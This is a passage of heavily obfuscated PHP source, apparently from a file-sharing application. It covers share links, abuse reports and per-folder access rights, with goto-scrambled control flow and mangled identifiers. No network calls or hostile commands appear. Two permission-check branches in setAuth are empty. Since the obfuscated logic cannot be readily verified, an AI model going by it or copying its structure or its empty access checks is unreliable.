$eõÏáÀ“ˆ› =& $_SERVER[¿õñ]; $fªœ ó“Ú = $this->getInfo($eäÌåÛĞ™); if (!$fªœ ó“Ú) { return !1; } goto bùÍ¤í‰à·; bùÍ¤í‰à·: $this->_checkLinkShare($B×ªÒ»‘ÆÆ, $fªœ ó“Ú); $EóÙì«òæÄ = array(); $EËî§©ÚË” = explode($eõÏáÀ“ˆ›[47], $eõÏáÀ“ˆ›[2146]); goto A‹–Şà‘†; e÷ğ•¢é’í: if (isset($B×ªÒ»‘ÆÆ[$eõÏáÀ“ˆ›[2132]])) { $this->_shareAuthSet($eäÌåÛĞ™, $B×ªÒ»‘ÆÆ[$eõÏáÀ“ˆ›[2132]]); } return !0; goto A˜ˆôÇÜë; A‹–Şà‘†: foreach ($EËî§©ÚË” as $EÈ¹–¥ùÁ™) { if (!array_key_exists($EÈ¹–¥ùÁ™, $B×ªÒ»‘ÆÆ)) { continue; } $EóÙì«òæÄ[$EÈ¹–¥ùÁ™] = $B×ªÒ»‘ÆÆ[$EÈ¹–¥ùÁ™]; } $this->shareEventAdd($fªœ ó“Ú[$eõÏáÀ“ˆ›[366]], $B×ªÒ»‘ÆÆ, $eõÏáÀ“ˆ›[1982]); $this->where(array($eõÏáÀ“ˆ›[436] => $eäÌåÛĞ™))->save($EóÙì«òæÄ); goto e÷ğ•¢é’í; A˜ˆôÇÜë: } private function _checkLinkShare($b¿éõÖÖ™¹, $AªÈÚÑíÕÜ) { $AÙ ¹À·Ü³ =& $_SERVER[¿õñ]; if ($b¿éõÖÖ™¹[$AÙ ¹À·Ü³[442]] != $AÙ ¹À·Ü³[493] || $AªÈÚÑíÕÜ[$AÙ ¹À·Ü³[388]][$AÙ ¹À·Ü³[29]] != $AÙ ¹À·Ü³[164]) { return; } $F´éŠá”­ = Model($AÙ ¹À·Ü³[759])->fileInfoGet($AªÈÚÑíÕÜ[$AÙ ¹À·Ü³[388]][$AÙ ¹À·Ü³[366]]); if (!$F´éŠá”­) { return; } $BçŞ†•ÙÕ¾ = $this->shareFileMeta($F´éŠá”­[$AÙ ¹À·Ü³[415]]); if (isset($BçŞ†•ÙÕ¾[$AÙ ¹À·Ü³[354]]) && $BçŞ†•ÙÕ¾[$AÙ ¹À·Ü³[354]] == $AÙ ¹À·Ü³[493]) { show_json(LNG($AÙ ¹À·Ü³[2147]), !1); } } protected function remove($cğÓ¾›«Ô) { goto A‘›¦êÆ½Ò; A‘›¦êÆ½Ò: $cŞ¨„Ì™‹ =& $_SERVER[¿õñ]; if (is_array($cğÓ¾›«Ô)) { $cğÓ¾›«Ô = array($cŞ¨„Ì™‹[7], $cğÓ¾›«Ô); } $eî™Å…Ïç¸ = array($cŞ¨„Ì™‹[437] => $cğÓ¾›«Ô); goto aÍªğœØ¹¦; aÍªğœØ¹¦: $F¿£“Ğôà = $this->where($eî™Å…Ïç¸)->delete(); if ($F¿£“Ğôà) { Model($cŞ¨„Ì™‹[529])->where(array($cŞ¨„Ì™‹[437] => $cğÓ¾›«Ô))->delete(); } $A¡äøé„Ä‘ = is_array($cğÓ¾›«Ô) ? $cğÓ¾›«Ô[1] : array($cğÓ¾›«Ô); goto c‘êÕ±Ìë¢; c‘êÕ±Ìë¢: for ($aŒ—è³¦Îù = 0; $aŒ—è³¦Îù < count($A¡äøé„Ä‘); $aŒ—è³¦Îù++) { $cò«ç¤Ñö– = $this->getInfo($A¡äøé„Ä‘[$aŒ—è³¦Îù]); if ($cò«ç¤Ñö–[$cŞ¨„Ì™‹[444]] == $cŞ¨„Ì™‹[493]) { Model($cŞ¨„Ì™‹[498])->eventShare($cò«ç¤Ñö–[$cŞ¨„Ì™‹[366]], $cŞ¨„Ì™‹[2137]); } if ($cò«ç¤Ñö–[$cŞ¨„Ì™‹[442]] == $cŞ¨„Ì™‹[493]) { Model($cŞ¨„Ì™‹[498])->eventShare($cò«ç¤Ñö–[$cŞ¨„Ì™‹[366]], $cŞ¨„Ì™‹[2136]); } } return $F¿£“Ğôà; goto bô…†åóßÍ; bô…†åóßÍ: } protected function removeBySource($Bç¬‡˜êîä) { goto ağğÜ¡´å°; Fùš”ïŒÄ“: $this->where($F—…á‘³’£)->delete(); Model($cŞÊóõ±³†[529])->where($F—…á‘³’£)->delete(); goto aÅ« ’×Öâ; ağğÜ¡´å°: $cŞÊóõ±³† =& $_SERVER[¿õñ]; $F—…á‘³’£ = array($cŞÊóõ±³†[380] => array($cŞÊóõ±³†[381], $Bç¬‡˜êîä)); $BÁéğìöï = $this->field($cŞÊóõ±³†[437])->where($F—…á‘³’£)->select(); goto a·×éğ›Š; a·×éğ›Š: $BÁéğìöï = array_to_keyvalue($BÁéğìöï, $cŞÊóõ±³†[33], $cŞÊóõ±³†[437]); if (!$BÁéğìöï) { return; } $F—…á‘³’£ = array($cŞÊóõ±³†[436] => array($cŞÊóõ±³†[381], $BÁéğìöï)); goto Fùš”ïŒÄ“; aÅ« ’×Öâ: } public function listAll($f·©ØŞ¸’³) { goto B‘ºà”°¸ó; E•ÛÑÂ»°­: if ($f·©ØŞ¸’³[$B‘„„Âº‹[699]]) { $BŒ‰Ü©Æïó = $f·©ØŞ¸’³[$B‘„„Âº‹[700]] ? $f·©ØŞ¸’³[$B‘„„Âº‹[700]] : strtotime(date($B‘„„Âº‹[2148])); $ağ ¢È¦à×[$B‘„„Âº‹[184]] = array($B‘„„Âº‹[318], array($f·©ØŞ¸’³[$B‘„„Âº‹[699]], $BŒ‰Ü©Æïó)); } if ($f·©ØŞ¸’³[$B‘„„Âº‹[29]]) { $ağ ¢È¦à×[$f·©ØŞ¸’³[$B‘„„Âº‹[29]]] = 1; } else { $ağ ¢È¦à×[] = array($B‘„„Âº‹[442] => array($B‘„„Âº‹[933], 0), $B‘„„Âº‹[444] => array($B‘„„Âº‹[933], 0), $B‘„„Âº‹[2127] => $B‘„„Âº‹[2096]); } if ($f·©ØŞ¸’³[$B‘„„Âº‹[2092]]) { $ağ ¢È¦à×[] = array($B‘„„Âº‹[439] => $f·©ØŞ¸’³[$B‘„„Âº‹[2092]], $B‘„„Âº‹[1247] => array($B‘„„Âº‹[758], "\45{$f·©ØŞ¸’³[$B‘„„Âº‹[2092]]}\x25"), $B‘„„Âº‹[2127] => $B‘„„Âº‹[2096]); } goto DæˆÛƒ¹£›; DæˆÛƒ¹£›: $CÃíŠÙÓôå = $this->_makeOrder()->where($ağ ¢È¦à×)->selectPage(20); if (empty($CÃíŠÙÓôå[$B‘„„Âº‹[350]])) { return array(); } $this->_listDataApply($CÃíŠÙÓôå[$B‘„„Âº‹[350]]); goto d¤¼¹¨«¤Î; B‘ºà”°¸ó: $B‘„„Âº‹ =& $_SERVER[¿õñ]; $ağ ¢È¦à× = array(); if ($f·©ØŞ¸’³[$B‘„„Âº‹[1350]]) { $ağ ¢È¦à×[$B‘„„Âº‹[1350]] = $f·©ØŞ¸’³[$B‘„„Âº‹[1350]]; } goto E•ÛÑÂ»°­; d¤¼¹¨«¤Î: return $CÃíŠÙÓôå; goto A–ÉŒºÏ²à; A–ÉŒºÏ²à: } private function _listDataApply(&$FÈÕ‘‡½) { $DŠõ¸‚œë =& $_SERVER[¿õñ]; $A¦Â ÄÛİ = array_to_keyvalue($FÈÕ‘‡½, $DŠõ¸‚œë[33], $DŠõ¸‚œë[1350]); $aï“‹–ª©³ = Model($DŠõ¸‚œë[469])->userListInfo(array_unique($A¦Â ÄÛİ)); $f¢éŒ”“Õï = array_to_keyvalue($FÈÕ‘‡½, $DŠõ¸‚œë[33], $DŠõ¸‚œë[366]); $B—‘œ„™›’ = Model($DŠõ¸‚œë[759])->sourceListInfo($f¢éŒ”“Õï, !0); foreach ($FÈÕ‘‡½ as &$a­›òŒ—äŒ) { $e“šÉØ®™± = $a­›òŒ—äŒ[$DŠõ¸‚œë[1350]]; $a­›òŒ—äŒ[$DŠõ¸‚œë[2149]] = $aï“‹–ª©³[$e“šÉØ®™±] ? $aï“‹–ª©³[$e“šÉØ®™±] : !1; $få‰ÓîŒ¯ = $a­›òŒ—äŒ[$DŠõ¸‚œë[366]]; $a­›òŒ—äŒ[$DŠõ¸‚œë[388]] = $B—‘œ„™›’[$få‰ÓîŒ¯] ? $B—‘œ„™›’[$få‰ÓîŒ¯] : !1; } } private function _makeOrder($aŠ½‘¯†¨Ê = '') { goto d†´Ğİ²…; E©‰Ş¾ˆ´: $Bà²–Şøâ¥ = Input::get($féÁÂİÛáò[403], $féÁÂİÛáò[7], $féÁÂİÛáò[386], $C–ÍÙàïñ); $bà§Ó‘×éì = Input::get($féÁÂİÛáò[404], $féÁÂİÛáò[7], $féÁÂİÛáò[2150], array($féÁÂİÛáò[2091], $féÁÂİÛáò[400])); $bà§Ó‘×éì = $AÜ£œšğ³…[$bà§Ó‘×éì]; goto f‰µ‰““²Ü; f‰µ‰““²Ü: $aŠ½‘¯†¨Ê = $aŠ½‘¯†¨Ê . "{$Bà²–Şøâ¥}\40{$bà§Ó‘×éì}"; return $this->order($aŠ½‘¯†¨Ê); goto EÆ‚ˆ·†œ; d†´Ğİ²…: $féÁÂİÛáò =& $_SERVER[¿õñ]; $C–ÍÙàïñ = array($féÁÂİÛáò[184], $féÁÂİÛáò[700], $féÁÂİÛáò[2139], $féÁÂİÛáò[2140]); $AÜ£œšğ³… = array($féÁÂİÛáò[398] => $féÁÂİÛáò[399], $féÁÂİÛáò[400] => $féÁÂİÛáò[401]); goto E©‰Ş¾ˆ´; EÆ‚ˆ·†œ: } public function reportAdd($e®Û§›¼í¤) { $f·á¢Ñø„‰ =& $_SERVER[¿õñ]; $f•º†Ñòœä = array($f·á¢Ñø„‰[437] => $e®Û§›¼í¤[$f·á¢Ñø„‰[437]], $f·á¢Ñø„‰[1350] => USER_ID); if (Model($f·á¢Ñø„‰[2151])->where($f•º†Ñòœä)->find()) { return !1; } $EÄ•§éÒè = array($f·á¢Ñø„‰[437] => $e®Û§›¼í¤[$f·á¢Ñø„‰[437]], $f·á¢Ñø„‰[1247] => $e®Û§›¼í¤[$f·á¢Ñø„‰[1247]], $f·á¢Ñø„‰[366] => $e®Û§›¼í¤[$f·á¢Ñø„‰[366]], $f·á¢Ñø„‰[415] => $e®Û§›¼í¤[$f·á¢Ñø„‰[415]], $f·á¢Ñø„‰[1350] => USER_ID, $f·á¢Ñø„‰[29] => $e®Û§›¼í¤[$f·á¢Ñø„‰[29]], $f·á¢Ñø„‰[401] => $e®Û§›¼í¤[$f·á¢Ñø„‰[401]]); return Model($f·á¢Ñø„‰[2151])->add($EÄ•§éÒè); } public function reportList($aİÒìƒÑ¸Œ) { goto a‡¯ñÙäæÅ; a‡¯ñÙäæÅ: $e»‚ –“¹¼ =& $_SERVER[¿õñ]; $a»™‰ÙùÌ = array(); if ($aİÒìƒÑ¸Œ[$e»‚ –“¹¼[699]]) { $e ÈÓº‹•– = $aİÒìƒÑ¸Œ[$e»‚ –“¹¼[700]] ? $aİÒìƒÑ¸Œ[$e»‚ –“¹¼[700]] : strtotime(date($e»‚ –“¹¼[2148])); $a»™‰ÙùÌ[$e»‚ –“¹¼[184]] = array($e»‚ –“¹¼[318], array($aİÒìƒÑ¸Œ[$e»‚ –“¹¼[699]], $e ÈÓº‹•–)); } goto e›ƒø¾¨ëÛ; e›ƒø¾¨ëÛ: if (isset($aİÒìƒÑ¸Œ[$e»‚ –“¹¼[29]]) && in_array($aİÒìƒÑ¸Œ[$e»‚ –“¹¼[29]], array($e»‚ –“¹¼[493], $e»‚ –“¹¼[2152], $e»‚ –“¹¼[2153], $e»‚ –“¹¼[2154], $e»‚ –“¹¼[1830]))) { $a»™‰ÙùÌ[$e»‚ –“¹¼[29]] = $aİÒìƒÑ¸Œ[$e»‚ –“¹¼[29]]; } if (isset($aİÒìƒÑ¸Œ[$e»‚ –“¹¼[686]]) && in_array($aİÒìƒÑ¸Œ[$e»‚ –“¹¼[686]], array($e»‚ –“¹¼[464], $e»‚ –“¹¼[493], $e»‚ –“¹¼[2152], $e»‚ –“¹¼[2153]))) { $a»™‰ÙùÌ[$e»‚ –“¹¼[686]] = $aİÒìƒÑ¸Œ[$e»‚ –“¹¼[686]]; } $cÆØÍŠ²’ä = Input::get($e»‚ –“¹¼[404], $e»‚ –“¹¼[7], $e»‚ –“¹¼[2150], array($e»‚ –“¹¼[2091], $e»‚ –“¹¼[400])); goto C¦ÑÀ³ê; f´ôï·Ç: if (empty($DÜ¹÷æôÖË[$e»‚ –“¹¼[350]])) { return array(); } $this->_listDataApply($DÜ¹÷æôÖË[$e»‚ –“¹¼[350]]); return $DÜ¹÷æôÖË; goto E‡®ë„ÄÒ; C¦ÑÀ³ê: $A®Ñ¢òÇÆõ = array($e»‚ –“¹¼[398] => $e»‚ –“¹¼[399], $e»‚ –“¹¼[400] => $e»‚ –“¹¼[401]); $c©°ßë¤Ÿ§ = $e»‚ –“¹¼[2155] . $A®Ñ¢òÇÆõ[$cÆØÍŠ²’ä]; $DÜ¹÷æôÖË = Model($e»‚ –“¹¼[2151])->where($a»™‰ÙùÌ)->order($c©°ßë¤Ÿ§)->selectPage(20); goto f´ôï·Ç; E‡®ë„ÄÒ: } public function reportStatus($D¼Ûƒ¥Â›Ç) { goto fË­éĞœš¶; B˜œ¸£Éª™: $DÛ¬í×ö = Model($B¯ƒÛ‚¦¼[2151])->where($F±½ÕÁÓº)->save($DøÈ²–Š¹); if ($D¼Ûƒ¥Â›Ç[$B¯ƒÛ‚¦¼[686]] == $B¯ƒÛ‚¦¼[2152]) { if ($F‹„øò­º[$B¯ƒÛ‚¦¼[415]] != $B¯ƒÛ‚¦¼[464] && $this->shareFileMeta($F‹„øò­º[$B¯ƒÛ‚¦¼[415]])) { $this->shareFileMeta($F‹„øò­º[$B¯ƒÛ‚¦¼[415]], 0); } return $this->remove($F‹„øò­º[$B¯ƒÛ‚¦¼[437]]); } if ($DÛ¬í×ö && $D¼Ûƒ¥Â›Ç[$B¯ƒÛ‚¦¼[686]] == $B¯ƒÛ‚¦¼[2153]) { $a‘Ù—¬ÀÈ = $DøÈ²–Š¹[$B¯ƒÛ‚¦¼[686]] == $B¯ƒÛ‚¦¼[2153] ? 1 : 0; $this->shareFileMeta($F‹„øò­º[$B¯ƒÛ‚¦¼[415]], $a‘Ù—¬ÀÈ); $this->removeByFile($F‹„øò­º[$B¯ƒÛ‚¦¼[415]]); } goto b–ÉÁÅìß; Bé½¡˜ëÆ: if (!$F‹„øò­º) { return !1; } $DøÈ²–Š¹ = array($B¯ƒÛ‚¦¼[686] => $D¼Ûƒ¥Â›Ç[$B¯ƒÛ‚¦¼[686]]); if ($D¼Ûƒ¥Â›Ç[$B¯ƒÛ‚¦¼[686]] == $B¯ƒÛ‚¦¼[2153] && $F‹„øò­º[$B¯ƒÛ‚¦¼[686]] == $B¯ƒÛ‚¦¼[2153]) { $DøÈ²–Š¹[$B¯ƒÛ‚¦¼[686]] = 0; } goto B˜œ¸£Éª™; fË­éĞœš¶: $B¯ƒÛ‚¦¼ =& $_SERVER[¿õñ]; $F±½ÕÁÓº = array($B¯ƒÛ‚¦¼[364] => $D¼Ûƒ¥Â›Ç[$B¯ƒÛ‚¦¼[364]]); $F‹„øò­º = Model($B¯ƒÛ‚¦¼[2151])->where($F±½ÕÁÓº)->field($B¯ƒÛ‚¦¼[2156])->find(); goto Bé½¡˜ëÆ; b–ÉÁÅìß: return $DÛ¬í×ö; goto DŠ ×²šì®; DŠ ×²šì®: } private function removeByFile($Eö‹¢¸†åø) { goto f¥»æÕÃ©; cÁËÇÙå™Š: $B†¶ùõŠ½ó = array($B¯½¦öË¯[366] => array($B¯½¦öË¯[7], $d³¼ÉöÖ“Ï), $B¯½¦öË¯[442] => 1); $A×…ô´²¦® = Model($B¯½¦öË¯[1990])->where($B†¶ùõŠ½ó)->field($B¯½¦öË¯[437])->select(); $dñÙˆå¹È = array_to_keyvalue($A×…ô´²¦®, $B¯½¦öË¯[33], $B¯½¦öË¯[437]); goto b‘Ş‹ñ¯×Í; b‘Ş‹ñ¯×Í: $this->remove($dñÙˆå¹È); goto F«º‰ºƒÉ„; f¥»æÕÃ©: $B¯½¦öË¯ =& $_SERVER[¿õñ]; $A×…ô´²¦® = Model($B¯½¦öË¯[759])->where(array($B¯½¦öË¯[415] => $Eö‹¢¸†åø))->field($B¯½¦öË¯[366])->select(); $d³¼ÉöÖ“Ï = array_to_keyvalue($A×…ô´²¦®, $B¯½¦öË¯[33], $B¯½¦öË¯[366]); goto cÁËÇÙå™Š; F«º‰ºƒÉ„: } private function shareFileMeta($EÆÓÔâŸï•, $AÈ†î»Ò˜— = null) { $Cñó­²ÎÃ‰ =& $_SERVER[¿õñ]; $D…äªµ•È² = array($Cñó­²ÎÃ‰[415] => $EÆÓÔâŸï•, $Cñó­²ÎÃ‰[88] => $Cñó­²ÎÃ‰[2157]); if (is_null($AÈ†î»Ò˜—)) { return Model($Cñó­²ÎÃ‰[2158])->where($D…äªµ•È²)->find(); } $D…äªµ•È²[$Cñó­²ÎÃ‰[354]] = $AÈ†î»Ò˜—; Model($Cñó­²ÎÃ‰[2158])->add($D…äªµ•È², array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\157\137\163\x6f\165\162\x63\145\137\x61\x75\x74\150"; public function getAuth($b¨²¢Ìå›•) { goto c™—ƒÀÉˆŒ; c™—ƒÀÉˆŒ: $bí…Ÿ•Óá =& $_SERVER[¿õñ]; $C„åïØ˜¥‡ = $bí…Ÿ•Óá[2159]; $BÕÁ†…ÂÓ  = array($bí…Ÿ•Óá[366] => $b¨²¢Ìå›•); goto d ŒÌˆÚ±; d ŒÌˆÚ±: $EÀ‡çÄå¬½ = $this->field($C„åïØ˜¥‡)->order($bí…Ÿ•Óá[364])->where($BÕÁ†…ÂÓ )->select(); $b³Û‹’½‚© = array(); foreach ($EÀ‡çÄå¬½ as $fÅ£Â­˜) { if (Model($bí…Ÿ•Óá[2160])->listData($fÅ£Â­˜[$bí…Ÿ•Óá[2144]])) { $b³Û‹’½‚©[] = $fÅ£Â­˜; } } goto Aåä‰¼ºë£; Aåä‰¼ºë£: return $b³Û‹’½‚©; goto DÚáÃÓ‘±Ä; DÚáÃÓ‘±Ä: } public function setAuth($dˆ¬††¥Ô, $fâøÆÅ„õ­) { goto a¥Öİ‹Ø¥; CñíµØ¯Ø®: $this->where(array($c²†øéßÆ[380] => $dˆ¬††¥Ô))->delete(); $this->addAll($e§Ş¿¯Ç³ë); return !0; goto dÛé¢ë®Ü¢; EšâÂ‰ˆöÁ: $fòâ½£Ó­ = 1; $a‚¡µ‚‘ = $Dèˆæ«áïí[$c²†øéßÆ[452]]; if ($a‚¡µ‚‘ != $fòâ½£Ó­) { $dËŸóŒÌÚ = array($c²†øéßÆ[2013] => $a‚¡µ‚‘); $a˜î¯Üñµë = Model($c²†øéßÆ[2090])->field($c²†øéßÆ[1350])->where($dËŸóŒÌÚ)->select(); $a˜î¯Üñµë = array_to_keyvalue($a˜î¯Üñµë, $c²†øéßÆ[33], $c²†øéßÆ[1350]); } goto E·‰ğ–õá; a¥Öİ‹Ø¥: $c²†øéßÆ =& $_SERVER[¿õñ]; $Dèˆæ«áïí = Model($c²†øéßÆ[1087])->sourceInfo($dˆ¬††¥Ô); if ($Dèˆæ«áïí[$c²†øéßÆ[368]] != SourceModel::TYPE_GROUP) { return !1; } goto EšâÂ‰ˆöÁ; E·‰ğ–õá: $aªíÉ…‹ÁŠ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $e§Ş¿¯Ç³ë = array(); foreach ($fâøÆÅ„õ­ as $E¤åÂöº§¹) { if (!in_array($E¤åÂöº§¹[$c²†øéßÆ[368]], $aªíÉ…‹ÁŠ)) { show_json(LNG($c²†øéßÆ[2161]), !1); } if ($a‚¡µ‚‘ != $fòâ½£Ó­) { if ($E¤åÂöº§¹[$c²†øéßÆ[368]] == SourceModel::TYPE_GROUP) { } if ($E¤åÂöº§¹[$c²†øéßÆ[452]] != 0 && !in_array($E¤åÂöº§¹[$c²†øéßÆ[452]], $a˜î¯Üñµë)) { } } if ($E¤åÂöº§¹[$c²†øéßÆ[452]] == 0) { $E¤åÂöº§¹[$c²†øéßÆ[368]] = SourceModel::TYPE_USER; } $e§Ş¿¯Ç³ë[] = array($c²†øéßÆ[366] => $dˆ¬††¥Ô, $c²†øéßÆ[368] => intval($E¤åÂöº§¹[$c²†øéßÆ[368]]), $c²†øéßÆ[452] => intval($E¤åÂöº§¹[$c²†øéßÆ[452]]), $c²†øéßÆ[2144] => intval($E¤åÂöº§¹[$c²†øéßÆ[2144]]) ? intval($E¤åÂöº§¹[$c²†øéßÆ[2144]]) : 0, $c²†øéßÆ[2145] => intval($E¤åÂöº§¹[$c²†øéßÆ[2145]]) ? intval($E¤åÂöº§¹[$c²†øéßÆ[2145]]) : -1); } goto CñíµØ¯Ø®; dÛé¢ë®Ü¢: } public function authClear($bæñ¦³Áñç) { $BéæÄîÖ„í =& $_SERVER[¿õñ]; $fâÆÎèå©Ã = Model($BéæÄîÖ„í[1087])->sourceInfo($bæñ¦³Áñç); $Dİ•´âïš = array($bæñ¦³Áñç); if ($fâÆÎèå©Ã[$BéæÄîÖ„í[367]] == $BéæÄîÖ„í[493]) { $dù£Ë™ğÂÛ = array($BéæÄîÖ„í[518] => array($BéæÄîÖ„í[475], $fâÆÎèå©Ã[$BéæÄîÖ„í[455]] . $bæñ¦³Áñç . $BéæÄîÖ„í[476])); $Dİ•´âïš = Model($BéæÄîÖ„í[1087])->field($BéæÄîÖ„í[380])->where($dù£Ë™ğÂÛ)->getField($BéæÄîÖ„í[366], !0); $Dİ•´âïš[] = $bæñ¦³Áñç; } $this->where(array($BéæÄîÖ„í[380] => array($BéæÄîÖ„í[381], $Dİ•´âïš)))->delete(); return !0; } public function get($CÑƒ…‘‘»­) { $Aöõã„¯³ = $this->getSourceList(array($CÑƒ…‘‘»­), !0); return $Aöõã„¯³[0]; } public function getSourceList($F–³„ñî˜, $Aâ»ÕÕÙæ = false) { goto f¬¡Ó“¢Îè; BÅ¯½ÎÙ²Ú: $Eğ®ÍéÙ´ = array(); foreach ($Aâ»ÕÕÙæ as $Bø¾³ˆÁô => $eÏé˜¢Îİ) { $Eğ®ÍéÙ´[$Bø¾³ˆÁô] = $this->makeSourceAuth($eÏé˜¢Îİ, $B¡ˆÑÎ”Ş); } return $Eğ®ÍéÙ´; goto C…­†ËÍœÓ; cå»­›·íÁ: if (!$Aâ»ÕÕÙæ) { $a«°°Ò°¸ = array($b÷Ü¸™ÎÖ[380] => array($b÷Ü¸™ÎÖ[381], $F–³„ñî˜)); $Aâ»ÕÕÙæ = $EÆØ¦‚‚ÖÉ->field($b÷Ü¸™ÎÖ[2162])->where($a«°°Ò°¸)->select(); $Aâ»ÕÕÙæ = array_to_keyvalue($Aâ»ÕÕÙæ, $b÷Ü¸™ÎÖ[366]); } $fˆÃŠôÅ‚ = $F–³„ñî˜; foreach ($Aâ»ÕÕÙæ as $FçÂÒòÙÑ => $fâöÒ­÷Ï¬) { $Fæ¥Ç³£»‚ = $EÆØ¦‚‚ÖÉ->parentLevelArray($fâöÒ­÷Ï¬[$b÷Ü¸™ÎÖ[455]]); $fˆÃŠôÅ‚ = array_merge($fˆÃŠôÅ‚, $Fæ¥Ç³£»‚, array($FçÂÒòÙÑ)); } goto cçöÃ—ˆëó; cçöÃ—ˆëó: $fˆÃŠôÅ‚ = array_values(array_unique($fˆÃŠôÅ‚)); if (!$fˆÃŠôÅ‚) { return array(); } $fñÑ£ù¼Àè = $b÷Ü¸™ÎÖ[2163]; goto A°ƒéÊ®; A°ƒéÊ®: $a«°°Ò°¸ = array($b÷Ü¸™ÎÖ[380] => array($b÷Ü¸™ÎÖ[381], $fˆÃŠôÅ‚)); $B¡ˆÑÎ”Ş = $this->field($fñÑ£ù¼Àè)->where($a«°°Ò°¸)->select(); $B¡ˆÑÎ”Ş = array_to_keyvalue_group($B¡ˆÑÎ”Ş, $b÷Ü¸™ÎÖ[366]); goto BÅ¯½ÎÙ²Ú; f¬¡Ó“¢Îè: $b÷Ü¸™ÎÖ =& $_SERVER[¿õñ]; if (!$F–³„ñî˜) { return array(); } $EÆØ¦‚‚ÖÉ = Model($b÷Ü¸™ÎÖ[1087]); goto cå»­›·íÁ; C…­†ËÍœÓ: } public function authDeepCheck($e–ğŞ‡ŸñÇ, $Aâ»¡æß’ = false) { $f›ŞÎ©Â =& $_SERVER[¿õñ]; if ($GLOBALS[$f›ŞÎ©Â[453]]) { return !1; } $AªÇíìêí“ = $this->makeAuthDeep(); if (!in_array($e–ğŞ‡ŸñÇ, $AªÇíìêí“)) { return !1; } return array($f›ŞÎ©Â[374] => -1, $f›ŞÎ©Â[414] => array($f›ŞÎ©Â[382] => $f›ŞÎ©Â[1016], $f›ŞÎ©Â[2019] => $f›ŞÎ©Â[464], $f›ŞÎ©Â[383] => LNG($f›ŞÎ©Â[2164]), $f›ŞÎ©Â[2031] => $f›ŞÎ©Â[2165])); } protected function makeAuthDeep() { goto D…Ò˜áÃ×Ü; DàÚîÍá: $A”ôÜŸÓÁ¼ = Model($cß¹ó£øã[2166])->listData(); $c÷³‘àÛ‰” = array(); foreach ($A”ôÜŸÓÁ¼ as $FåË«Ô…›Å) { if ($FåË«Ô…›Å[$cß¹ó£øã[373]] == 0 && $FåË«Ô…›Å[$cß¹ó£øã[2033]] == $cß¹ó£øã[493]) { $c÷³‘àÛ‰”[] = $FåË«Ô…›Å[$cß¹ó£øã[364]]; } } goto BµèŠÁÛ´ø; e±ô¶‘©¦Î: if ($e¿‰¬è¨İÛ) { $fÖæñ–ÍÓš = array(array($cß¹ó£øã[368] => SourceModel::TYPE_USER, $cß¹ó£øã[452] => USER_ID), array($cß¹ó£øã[368] => SourceModel::TYPE_GROUP, $cß¹ó£øã[452] => array($cß¹ó£øã[381], $e¿‰¬è¨İÛ)), $cß¹ó£øã[921] => $cß¹ó£øã[2096]); } if ($c÷³‘àÛ‰”) { $fÖæñ–ÍÓš = array($fÖæñ–ÍÓš, $cß¹ó£øã[2144] => array($cß¹ó£øã[2167], $c÷³‘àÛ‰”)); } $DÁÜÆî·Ø = $this->field($cß¹ó£øã[2168])->where($fÖæñ–ÍÓš)->select(); goto BÇèæéáÀî; BµèŠÁÛ´ø: $e¿‰¬è¨İÛ = Session::get($cß¹ó£øã[2128]); $e¿‰¬è¨İÛ = array_to_keyvalue($e¿‰¬è¨İÛ, $cß¹ó£øã[33], $cß¹ó£øã[2013]); $fÖæñ–ÍÓš = array($cß¹ó£øã[368] => SourceModel::TYPE_USER, $cß¹ó£øã[452] => USER_ID); goto e±ô¶‘©¦Î; Aí»ğæĞ²Ÿ: return $CÔÑ·‰ŒÈ°; goto C–Üğ‹çò©; D…Ò˜áÃ×Ü: $cß¹ó£øã =& $_SERVER[¿õñ]; static $CÔÑ·‰ŒÈ° = false; if ($CÔÑ·‰ŒÈ°) { return $CÔÑ·‰ŒÈ°; } goto DàÚîÍá; AßÆ×¶á‡µ: $d«½Àğâ¯Ã = array_values(array_unique($d«½Àğâ¯Ã)); $e³İ‚„Ò¢Ã = $d«½Àğâ¯Ã; foreach ($e³İ‚„Ò¢Ã as $aÎ¬ÍøÙÃš) { $B—õ šíÓ¨ = $d¿ÇÔ‡²´ç->getInfo($aÎ¬ÍøÙÃš); $aøìÃéµ‚„ = $CÅ¸èáÏø->parentLevelArray($B—õ šíÓ¨[$cß¹ó£øã[455]]); $d«½Àğâ¯Ã = array_merge($d«½Àğâ¯Ã, $aøìÃéµ‚„); } goto b‹­™éÜÈÖ; Dæ»‰’¾ÒÉ: $CÅ¸èáÏø = Model($cß¹ó£øã[1087]); $d¿ÇÔ‡²´ç = Model($cß¹ó£øã[454]); if ($e¹»¨§À…) { $c·ô„éš³Õ = $CÅ¸èáÏø->where(array($cß¹ó£øã[366] => array($cß¹ó£øã[381], $e¹»¨§À…)))->select(); foreach ($c·ô„éš³Õ as $D‹Õ¿¸Ôñ) { $aøìÃéµ‚„ = $CÅ¸èáÏø->parentLevelArray($D‹Õ¿¸Ôñ[$cß¹ó£øã[455]]); $CÔÑ·‰ŒÈ° = array_merge($CÔÑ·‰ŒÈ°, $aøìÃéµ‚„); $d«½Àğâ¯Ã[] = $D‹Õ¿¸Ôñ[$cß¹ó£øã[452]]; } } goto AßÆ×¶á‡µ; BÇèæéáÀî: $e¹»¨§À… = array_to_keyvalue($DÁÜÆî·Ø, $cß¹ó£øã[33], $cß¹ó£øã[366]); $CÔÑ·‰ŒÈ° = array(); $d«½Àğâ¯Ã = $e¿‰¬è¨İÛ; goto Dæ»‰’¾ÒÉ; b‹­™éÜÈÖ: $d«½Àğâ¯Ã = array_values(array_unique($d«½Àğâ¯Ã)); foreach ($d«½Àğâ¯Ã as $aÎ¬ÍøÙÃš) { $B—õ šíÓ¨ = $d¿ÇÔ‡²´ç->getInfo($aÎ¬ÍøÙÃš); $CÔÑ·‰ŒÈ°[] = $B—õ šíÓ¨[$cß¹ó£øã[388]][$cß¹ó£øã[366]]; } $CÔÑ·‰ŒÈ° = array_values(array_unique($CÔÑ·‰ŒÈ°)); goto Aí»ğæĞ²Ÿ; C–Üğ‹çò©: } private function makeSourceAuth($d°„„¸¿®Â, $AÚ¯ØƒÛŒ) { goto c¬ÈĞİÃëÌ; bŠÃŸË»÷: if (!$bÈË ÅßÅ) { $fÍ†™ÁÜ¹‰ = array_to_keyvalue($fÍ†™ÁÜ¹‰, $f·¿Ø¿›Ø[2013]); $A´¯×¶° = $d°„„¸¿®Â[$f·¿Ø¿›Ø[452]]; $Dò•ñ‡¢êÄ = isset($fÍ†™ÁÜ¹‰[$A´¯×¶°]) ? $fÍ†™ÁÜ¹‰[$A´¯×¶°] : !1; 